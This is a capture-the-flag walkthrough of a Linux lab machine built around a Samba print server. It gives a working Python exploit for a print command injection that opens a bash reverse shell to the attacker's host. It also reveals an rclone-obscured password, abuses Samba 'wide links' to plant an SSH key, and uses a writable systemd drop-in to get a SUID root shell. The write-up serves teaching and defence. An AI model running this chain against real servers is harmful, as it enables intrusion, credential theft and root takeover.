01

Summary

Abducted is a medium-difficulty Linux machine centered around a Samba file/print server. The exploitation chain involves:

  • Unauthenticated RCE via CVE-2026-4480 (Samba Print Command Injection)
  • Credential reuse from an rclone backup config
  • Samba misconfiguration (force user + wide links)
  • Polkit + systemd privilege escalation to root
02

Enumeration

nmap -sC -sV -oN nmap/initial.txt <TARGET_IP>
nmap -p- --min-rate 10000 <TARGET_IP>

Open Ports:

22/tcp → OpenSSH 9.6p1
139/tcp & 445/tcp → Samba 4
smbclient -L //<TARGET_IP> -N

Shares:

  • HP-Reception (Printer, Guest accessible)
  • projects
  • transfer
Why this matteredGuest-accessible printer shares on Samba are worth a second look — printing pipelines often shell out to an external command with job metadata baked in.
03

Initial Foothold — CVE-2026-4480 (Print Command Injection)

The HP-Reception printer share has print command = /usr/local/bin/printaudit %J %s, where %J (job name) is not properly sanitized. Exploited using Samba's Python spoolss bindings.

Exploit Script (exploit.py):

#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials
import sys

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <RHOST> <LHOST> <LPORT>")
    sys.exit(1)

RHOST, LHOST, LPORT = sys.argv[1], sys.argv[2], int(sys.argv[3])

DATA = (f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' >/dev/null 2>&1 &\n").encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()

iface = spoolss.spoolss(rf"ncacn_np:{RHOST}[\pipe\spoolss]", lp, creds)
h = iface.OpenPrinter(rf"\\{RHOST}\HP-Reception", "", spoolss.DevmodeContainer(), 0x00000008)

i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"
i1.output_file = None
i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr()
ctr.level = 1
ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)
iface.ClosePrinter(h)

print("[+] Job submitted")

Usage:

nc -lvnp 4444
python3 exploit.py <TARGET_IP> <kali vpn> 4444

→ Shell as nobody

Why this matteredCommand-injection surface doesn't have to be a web form — anywhere a server-side process builds a shell command from client-controlled metadata (here, a print job's own name) is the same bug class.
04

User Flag (scott)

cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = <obscured rclone secret>

Decode the obscured password:

rclone reveal <obscured rclone secret>
# Output: <recovered plaintext password>
ssh scott@<TARGET_IP>
User Flag
Why this mattered"Obscured" is not a security control — if the tool that wrote the secret can also read it back with a public flag, so can anyone who finds the config file.
05

Privilege Escalation — scott → marcus

The transfer share is configured with:

[transfer]
   force user = marcus
   wide links = yes

Exploit:

ssh-keygen -q -t ed25519 -N '' -f /tmp/k
ln -s /home/marcus /srv/transfer/mh

smbclient //127.0.0.1/transfer -U 'scott%<recovered password>' -c '
mkdir mh/.ssh;
put /tmp/k.pub mh/.ssh/authorized_keys
'

ssh -i /tmp/k marcus@127.0.0.1

Now we are marcus (member of operators group).

Why this matteredwide links is one of the more dangerous Samba options still seen in the wild — combined with a forced service user, it turns "write access to a share" into "write access anywhere that user can reach."
06

Root Privilege Escalation

The operators group has polkit permission to reload systemd (org.freedesktop.systemd1.reload-daemon). The directory /etc/systemd/system/smbd.service.d/ is group-writable (drwxrws---).

Create systemd drop-in:

cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF

systemctl daemon-reload
systemctl restart smbd

Get root:

/tmp/.rb -p -c 'id; cat /root/root.txt'
Root Flag
Why this matteredPolkit rules are frequently scoped too broadly — "can reload a specific service" quietly becomes "can run arbitrary root commands" the moment the matching unit's config directory is writable by the same group.
07

Key Lessons

  • Always enumerate printer shares carefully — they can be dangerous.
  • rclone obscured passwords are trivial to reveal.
  • force user + wide links is a dangerous combination.
  • Polkit delegations + writable systemd drop-in directories = easy root.
